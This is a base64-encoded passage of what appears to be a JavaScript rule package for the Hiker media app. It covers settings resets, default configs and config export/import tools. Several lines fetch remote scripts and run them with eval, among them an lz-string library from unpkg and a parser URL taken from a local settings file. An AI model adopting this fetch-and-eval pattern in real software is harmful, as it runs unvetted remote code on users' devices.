V4dF8xJyxcXFxcbiAgICAgICAgdXJsOiAkKFsn6YeN572u5pif5pif6aKc6ImyJywgJ+mHjee9rumAieS4reagh+etvuminOiJsicsICfph43nva7lv6vpgJ/mkJzntKInLCAn6YeN572u6aaW6aG15Li66buY6K6kJywgJ+mHjee9ruivpuaDhemhtScgLCAn5riF6Zmk5YWo6YOo6K6+572uJ10sIDEpLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICByZXR1cm4gJChcXFxcXFxcIuehruWumuimgVxcXFxcXFwiICsgaW5wdXQgKyBcXFxcXFxcIu+8n1xcXFxcXFwiKS5jb25maXJtKChzZWwpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXRlbSA9ICcnO1xcXFxuICAgICAgICAgICAgICAgIHN3aXRjaCAoc2VsKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNhc2UgJ+mHjee9ruaYn+aYn+minOiJsic6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpdGVtID0gJ3N0YXJDb2xvcic7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgICAgICAgICAgY2FzZSAn6YeN572u6YCJ5Lit5qCH562+6aKc6ImyJzpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0gPSAnY2hvb3NlQ29sb3InO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNhc2UgJ+mHjee9ruW/q+mAn+aQnOe0oic6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpdGVtID0gJ3F1aWNrU2VhcmNoQ29uZmlncyc7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgICAgICAgICAgY2FzZSAn6YeN572u6aaW6aG15Li66buY6K6kJzpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0gPSAnaG9tZVBhZ2VDb25maWdzJztcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgICAgICAgICBjYXNlICfph43nva7or6bmg4XpobUnOlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaXRlbSA9ICdkZXRhaWxWaWV3Q29uZmlncyc7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgICAgICAgICAgY2FzZSAn5riF6Zmk5YWo6YOo6K6+572uJzpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0gPSAnYWxsJztcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAvLyBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3NldHRpbmdQYWdlJykpLnJ1bGUpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBkZWZhdWx0Q29uZmlncyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9kZWZhdWx0Q29uZmlnc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoaXRlbSA9PSAnYWxsJykge1xcXFxuICAgICAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoZGVmYXVsdENvbmZpZ3MpKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7JcXFxcXFxcIiArIHNlbDtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYoaXRlbSA9PSBcXFxcXFxcImhvbWVQYWdlQ29uZmlnc1xcXFxcXFwiKXtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UoZmV0Y2goZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpO1xcXFxuICAgICAgICAgICAgICAgICAgICBjb25maWdbaXRlbV1bXFxcXFxcXCLpu5jorqRcXFxcXFxcIl0gPSBkZWZhdWx0Q29uZmlnc1tpdGVtXVtcXFxcXFxcIum7mOiupFxcXFxcXFwiXTtcXFxcbiAgICAgICAgICAgICAgICAgICAgY29uZmlnW2l0ZW1dLnVzZSA9IFxcXFxcXFwi6buY6K6kXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7JcXFxcXFxcIiArIHNlbDtcXFxcbiAgICAgICAgICAgICAgICB9ZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKGZldGNoKGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgY29uZmlnW2l0ZW1dID0gZGVmYXVsdENvbmZpZ3NbaXRlbV07XFxcXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7JcXFxcXFxcIiArIHNlbDtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9LCBpbnB1dClcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9KVxcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcbn1cXFxcblxcXFxubGV0IHZpZXcgPSBnZXRQYXJhbShcXFxcXFxcInZpZXdcXFxcXFxcIixcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbmlmKHZpZXc9PVxcXFxcXFwiXFxcXFxcXCIpe1xcXFxuICAgIHNldFBhZ2VUaXRsZShcXFxcXFxcIuiuvue9rlxcXFxcXFwiKVxcXFxuICAgIHNldHRpbmdQYWdlKCk7XFxcXG59ZWxzZSBpZih2aWV3PT1cXFxcXFxcImFuYWx5c2lzU2V0dGluZ01vZHVsZVxcXFxcXFwiKXtcXFxcbiAgICBsZXQgZCA9IFtdO1xcXFxuICAgIHNldFBhZ2VUaXRsZShcXFxcXFxcIuino+aekOiuvue9rlxcXFxcXFwiKVxcXFxuICAgIGFuYWx5c2lzU2V0dGluZ01vZHVsZShkKTtcXFxcbiAgICBzZXRSZXN1bHQoZCk7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6buY6K6k6YWN572uXFxcIixcXFwicGF0aFxcXCI6XFxcImRlZmF1bHRDb25maWdzXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxyXFxcXG5sZXQgZGVmYXVsdENvbmZpZ3MgPSB7XFxcXHJcXFxcbiAgICBzdGFyQ29sb3I6IFxcXFxcXFwiI2ZmYWMyZFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgY2hvb3NlQ29sb3I6IFxcXFxcXFwiI0ZBNzI5OFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgcXVpY2tTZWFyY2hDb25maWdzOiB7XFxcXHJcXFxcbiAgICAgICAgbW9kZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgb3JkZXI6IFtcXFxcXFxcIua1t+mYlOaQnOe0olxcXFxcXFwiXSxcXFxcclxcXFxuICAgICAgICBcXFxcXFxcIua1t+mYlOaQnOe0olxcXFxcXFwiOiB7XFxcXHJcXFxcbiAgICAgICAgICAgIG5hbWU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIHBpYzogXFxcXFxcXCJcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH0sXFxcXHJcXFxcbiAgICBkZXRhaWxzVmlld0NvbmZpZ3M6IHtcXFxcclxcXFxuICAgICAgICB1c2U6IFxcXFxcXFwi6buY6K6kXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgXFxcXFxcXCLpu5jorqRcXFxcXFxcIjoge1xcXFxyXFxcXG4gICAgICAgICAgICBjb25maWc6IFxcXFxcXFwiZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO2RldGFpbHNWaWV3KHR5cGUsIGlkKTtcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH0sXFxcXHJcXFxcbiAgICBob21lUGFnZUNvbmZpZ3M6e1xcXFxyXFxcXG4gICAgICAgIHVzZTogXFxcXFxcXCLpu5jorqRcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICBcXFxcXFxcIum7mOiupFxcXFxcXFwiOiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGNvbmZpZzogYGxldCBkID0gW107XFxcXHJcXFxcbmQucHVzaCh7XFxcXHJcXFxcbiAgICB0aXRsZTogJycsXFxcXHJcXFxcbiAgICBpbWc6ICdodHRwczovL2dpdGNvZGUubmV0L3FxXzQxODQ2NzU2L2hpa2VyLy0vcmF3L21hc3Rlci9pbWcv6LGG55OjLnBuZycsXFxcXHJcXFxcbiAgICBkZXNjOiAnMCcsXFxcXHJcXFxcbiAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzEnLFxcXFxyXFxcXG4gICAgdXJsOiAnaGlrZXI6Ly9wYWdlL3NldHRpbmdQYWdlJ1xcXFxyXFxcXG59KVxcXFxyXFxcXG5cXFxcclxcXFxubGV0IHMgPSBbXFxcXFxcXCLmjqjojZBcXFxcXFxcIiwgXFxcXFxcXCLng63pl6hcXFxcXFxcIiwgXFxcXFxcXCLliIbnsbtcXFxcXFxcIiwgXFxcXFxcXCLniYfljZVcXFxcXFxcIiwgXFxcXFxcXCLmppzljZVcXFxcXFxcIiwgXFxcXFxcXCLlsIbkuIrmmKBcXFxcXFxcIl07XFxcXHJcXFxcbmxldCBpbWcgPSBcXFxcXFxcImh0dHBzOi8vZ2l0Y29kZS5uZXQvcXFfNDE4NDY3NTYvaGlrZXIvLS9yYXcvbWFzdGVyL2ltZy9cXFxcXFxcIjtcXFxcclxcXFxuZm9yIChsZXQgaSBpbiBzKSB7XFxcXHJcXFxcbiAgICBkLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiBzW2ldLFxcXFxyXFxcXG4gICAgICAgIGltZzogaW1nICsgc1tpXSArICcuanBnJyxcXFxcclxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ljb25fMicsXFxcXHJcXFxcbiAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIiArICckcGFnZXtmeXBhZ2V9LyMvJyArIHNbaV0gKyBcXFxcXFxcIiNub0hpc3RvcnkjXFxcXFxcXCJcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcbn1cXFxcclxcXFxucmV0dXJuIGQ7YFxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH0sXFxcXHJcXFxcbiAgICBhbmFseXNpc0NvbmZpZ3M6IHtcXFxcclxcXFxuICAgICAgICB1c2U6IFxcXFxcXFwi5LiN6Kej5p6QXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgXFxcXFxcXCLkuI3op6PmnpBcXFxcXFxcIjoge1xcXFxyXFxcXG4gICAgICAgICAgICBjb25maWc6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGlucHV0O1xcXFxyXFxcXG4gICAgICAgICAgICB9KSxcXFxcclxcXFxuICAgICAgICAgICAgc2V0dGluZzogJC50b1N0cmluZygoKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ivpeaPkuS7tuaXoOiuvue9rumhtemdolxcXFxcXFwiO1xcXFxyXFxcXG4gICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIH0sXFxcXHJcXFxcbiAgICAgICAgXFxcXFxcXCLmlq3mj5JcXFxcXFxcIjoge1xcXFxyXFxcXG4gICAgICAgICAgICBjb25maWc6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IGZpbGUgPSBcXFxcXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvRHVhbk5pYW4vTXlQYXJzZS5qc29uXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBsZXQgb2xkZmlsZSA9IFxcXFxcXFwiaGlrZXI6Ly9maWxlcy9jYWNoZS9NeVBhcnNlU2V0Lmpzb25cXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmIChmaWxlRXhpc3QoZmlsZSkpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKCdqc29uPScgKyBmZXRjaChmaWxlKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGpzVXJsID0ganNvbi5zZXR0aW5ncy5jajtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKGZldGNoKGpzVXJsKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGF5dG1QYXJzZShpbnB1dCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGZpbGVFeGlzdChvbGRmaWxlKSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBqc1VybCA9IEpTT04ucGFyc2UoZmV0Y2gob2xkZmlsZSkpLmNqO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoZmV0Y2goanNVcmwpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gYXl0bVBhcnNlKGlucHV0KTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+ayoeaJvuWIsOaWreaPkumFjee9ruaWh+S7tic7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0pLFxcXFxyXFxcXG4gICAgICAgICAgICBzZXR0aW5nOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCBmaWxlID0gXFxcXFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL0R1YW5OaWFuL015UGFyc2UuanNvblxcXFxcXFwiO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IG9sZGZpbGUgPSBcXFxcXFxcImhpa2VyOi8vZmlsZXMvY2FjaGUvTXlQYXJzZVNldC5qc29uXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KGZpbGUpKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZXZhbCgnanNvbj0nICsgZmV0Y2goZmlsZSkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBqc1VybCA9IGpzb24uc2V0dGluZ3MuY2o7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZXZhbChmZXRjaChqc1VybCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBzZXRVcmw7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGZpbGVFeGlzdChvbGRmaWxlKSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBqc1VybCA9IEpTT04ucGFyc2UoZmV0Y2gob2xkZmlsZSkpLmNqO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoZmV0Y2goanNVcmwpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gc2V0VXJsO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL3BhZ2UvUm91dGU/cnVsZT1NeUZpZWxk4bSw4oG/JnR5cGU96K6+572uXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG59XFxcXHJcXFxcbiQuZXhwb3J0cyA9IGRlZmF1bHRDb25maWdzO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuW3peWFt+mbhlxcXCIsXFxcInBhdGhcXFwiOlxcXCJ1dGlsc1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcclxcXFxuLy/liJ3lp4vljJbphY3nva4sbmFtZeS4uumFjee9rumhueWQjeensFxcXFxyXFxcXG5mdW5jdGlvbiBpbml0Q29uZmlncyhuYW1lLCBjb25maWcpIHtcXFxcclxcXFxuICAgIGlmICghY29uZmlnKSB7XFxcXHJcXFxcbiAgICAgICAgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBpZiAoY29uZmlnW25hbWVdID09IG51bGwpIHtcXFxcclxcXFxuICAgICAgICBsZXQgZGVmYXVsdENvbmZpZ3MgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGVmYXVsdENvbmZpZ3NcXFxcXFxcIik7XFxcXHJcXFxcbiAgICAgICAgY29uZmlnW25hbWVdID0gZGVmYXVsdENvbmZpZ3NbbmFtZV0gPyBkZWZhdWx0Q29uZmlnc1tuYW1lXSA6IHt9O1xcXFxyXFxcXG4gICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIHJldHVybiBjb25maWc7XFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8v6I635Y+W6YWN572u6aG5XFxcXHJcXFxcbmZ1bmN0aW9uIGdldENvbmZpZyhuYW1lLCByb290Q29uZmlnKSB7XFxcXHJcXFxcbiAgICBsZXQgY29uZmlnID0gcm9vdENvbmZpZyA/IHJvb3RDb25maWcgOiBKU09OLnBhcnNlKGZldGNoKGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXFxcclxcXFxuICAgIGlmIChuYW1lKSB7XFxcXHJcXFxcbiAgICAgICAgaWYgKGNvbmZpZ1tuYW1lXSA9PSBudWxsKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGNvbmZpZyA9IGluaXRDb25maWdzKG5hbWUsIGNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIHJldHVybiBjb25maWdbbmFtZV07XFxcXHJcXFxcbiAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgIHJldHVybiBjb25maWc7XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8v57yW56CB5bel5YW357G7XFxcXHJcXFxcbmxldCBaaXBUb29sID0ge1xcXFxyXFxcXG4gICAgZGVwZW5kZW5jZTogJ2h0dHBzOi8vdW5wa2cuY29tL2x6LXN0cmluZ0AxLjQuNC9saWJzL2x6LXN0cmluZy5taW4uanMnLFxcXFxyXFxcXG4gICAgY29tcHJlc3M6IHtcXFxcclxcXFxuICAgICAgICBzaXplOiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGtleTogXFxcXFxcXCJ0ZXh0LWNvbXByZXNzLXNpemVcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgc2V0OiAobmV3VmFsdWUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKHRoaXMua2V5LCBuZXdWYWx1ZS50b1N0cmluZygpKVxcXFxyXFxcXG4gICAgICAgICAgICB9LFxcXFxyXFxcXG4gICAgICAgICAgICBnZXQ6ICgpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiBwYXJzZUludChnZXRNeVZhcih0aGlzLmtleSwgXFxcXFxcXCIwXFxcXFxcXCIpKVxcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfSxcXFxcclxcXFxuICAgICAgICBleGVjOiAoaW5wdXQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgZXZhbChyZXF1ZXN0KFppcFRvb2wuZGVwZW5kZW5jZSkpXFxcXHJcXFxcbiAgICAgICAgICAgIGxldCByZXN1bHQgPSBMWlN0cmluZy5jb21wcmVzc1RvRW5jb2RlZFVSSUNvbXBvbmVudChpbnB1dClcXFxcclxcXFxuICAgICAgICAgICAgICAgIC8vIFppcFRvb2wuY29tcHJlc3Muc2l6ZS5zZXQocmVzdWx0Lmxlbmd0aCAqIDIpXFxcXHJcXFxcbiAgICAgICAgICAgIHJldHVybiByZXN1bHRcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9LFxcXFxyXFxcXG4gICAgZGVjb21wcmVzczoge1xcXFxyXFxcXG4gICAgICAgIHNpemU6IHtcXFxcclxcXFxuICAgICAgICAgICAgZ2V0OiAoKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gZ2V0TXlWYXIoXFxcXFxcXCJ0ZXh0LWRlY29tcHJlc3NcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgLmxlbmd0aFxcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfSxcXFxcclxcXFxuICAgICAgICBleGVjOiAoaW5wdXQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgZXZhbChyZXF1ZXN0KFppcFRvb2wuZGVwZW5kZW5jZSkpXFxcXHJcXFxcbiAgICAgICAgICAgIGxldCByZXN1bHQgPSBMWlN0cmluZy5kZWNvbXByZXNzRnJvbUVuY29kZWRVUklDb21wb25lbnQoaW5wdXQpXFxcXHJcXFxcbiAgICAgICAgICAgIHJldHVybiByZXN1bHRcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8vIOmFjee9rumhueW3peWFt+exu1xcXFxyXFxcXG5sZXQgQ29uZmlnVG9vbCA9IHtcXFxcclxcXFxuICAgIGVuY1R5cGVMaXN0OiBbJ0Jhc2U2NCcsICdaaXBwZXInXS5jb25jYXQoZ2V0UGFzdGVzKCkpLFxcXFxyXFxcXG4gICAgdG9DbGlwYm9hcmQ6IChjb25maWdDb21tYW5kLCBuYW1lKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgaWYgKGNvbmZpZ0NvbW1hbmQuc3RhcnRzV2l0aCgndG9hc3Q6Ly8nKSkgcmV0dXJuIGNvbmZpZ0NvbW1hbmRcXFxcclxcXFxuICAgICAgICBpZiAoIW5hbWUpIHtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IGNvbW1hbmRTcGxpdHMgPSBjb25maWdDb21tYW5kLnNwbGl0KFxcXFxcXFwi77+lXFxcXFxcXCIpXFxcXHJcXFxcbiAgICAgICAgICAgIG5hbWUgPSBjb21tYW5kU3BsaXRzWzJdXFxcXHJcXFxcbiAgICAgICAgICAgIG5hbWUgPSBuYW1lID8gKFxcXFxcXFwi4oCcXFxcXFxcXCIgKyBuYW1lICsgXFxcXFxcXCLigJ1cXFxcXFxcIikgOiAnJ1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXHJcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiY29weTovL1xcXFxcXFwiICsgY29uZmlnQ29tbWFuZCArIFxcXFxcXFwiLmpzOid0b2FzdDovL+WvvOWHulxcXFxcXFwiICsgbmFtZSArIFxcXFxcXFwi5oiQ5Yqf77yBJ1xcXFxcXFwiO1xcXFxyXFxcXG4gICAgfSxcXFxcclxcXFxuICAgIGV4cG9ydDogKG5hbWUsIGNvbmZpZywgcmVtYXJrLCBlbmNUeXBlKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgbGV0IHN5bWJvbCA9IFxcXFxcXFwi6Z2S6LGG5Y+j5Luk77+lXFxcXFxcXCIgKyByZW1hcmsgKyBcXFxcXFxcIu+/pVxcXFxcXFwiICsgbmFtZSArIFxcXFxcXFwi77+lXFxcXFxcXCIgKyBlbmNUeXBlICsgXFxcXFxcXCLvv6VcXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICBsZXQgcmVzdWx0ID0gY29uZmlnXFxcXHJcXFxcbiAgICAgICAgaWYgKHR5cGVvZiByZXN1bHQgPT09IFxcXFxcXFwib2JqZWN0XFxcXFxcXCIpIHtcXFxcclxcXFxuICAgICAgICAgICAgcmVzdWx0ID0gSlNPTi5zdHJpbmdpZnkoY29uZmlnKTtcXFxcclxcXFxuICAgICAgICB9IGVsc2UgaWYgKHR5cGVvZiByZXN1bHQgPT09IFxcXFxcXFwic3RyaW5nXFxcXFxcXCIpIHtcXFxcclxcXFxuICAgICAgICAgICAgcmVzdWx0ID0gY29uZmlnO1xcXFxyXFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgIHRocm93IFxcXFxcXFwi5a+85Ye65pWw5o2u5LiN5ZCI5rOVXFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgc3dpdGNoIChlbmNUeXBlKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGNhc2UgJ0Jhc2U2NCc6XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXN1bHQgPSBiYXNlNjRFbmNvZGUocmVzdWx0KTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxyXFxcXG4gICAgICAgICAgICBjYXNlICdaaXBwZXInOlxcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gWmlwVG9vbC5jb21wcmVzcy5leGVjKHJlc3VsdClcXFxcclxcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxyXFxcXG4gICAgICAgICAgICBkZWZhdWx0IDpcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmIChnZXRBcHBWZXJzaW9uKCkgPiAyMDcwKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgc3ltYm9sID0gXFxcXFxcXCLpnZLosYblj6Pku6Tvv6VcXFxcXFxcIiArIHJlbWFyayArIFxcXFxcXFwi77+lXFxcXFxcXCIgKyBuYW1lXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gc2hhcmVQYXN0ZShDb25maWdUb29sLmV4cG9ydChuYW1lLCBjb25maWcsIHJlbWFyaywgJ1ppcHBlcicpLGVuY1R5cGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQgKyAnXFxcXFxcXFxuXFxcXFxcXFxuJyArIHN5bWJvbFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35pu05paw6KeG55WM54mI5pys6IezIEMyMDcwIOS7peS4iidcXFxcclxcXFxuICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgICAgICByZXN1bHQgPSBzeW1ib2wgKyByZXN1bHRcXFxcclxcXFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcXFxyXFxcXG4gICAgfSxcXFxcclxcXFxuICAgIGltcG9ydDogKGNvbmZpZ0NvbW1hbmQpID0+IHtcXFxcclxcXFxuICAgICAgICBsZXQgcmVzdWx0ID0gJydcXFxcclxcXFxuICAgICAgICBpZiAoY29uZmlnQ29tbWFuZC5zdGFydHNXaXRoKCfkupEnKSkge1xcXFxyXFxcXG4gICAgICAgICAgICBpZiAoZ2V0QXBwVmVyc2lvbigpID4gMjA3MCkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gY29uZmlnQ29tbWFuZC5zcGxpdCgn6Z2S6LGGJylbMF0ucmVwbGFjZSgvXFxcXFxcXFxcXFxcXFxcXG4vLCAnJylcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbmZpZ0NvbW1hbmQgPSBwYXJzZVBhc3RlKHJlc3VsdClcXFxcclxcXFxuICAgICAgICAgICAgfSB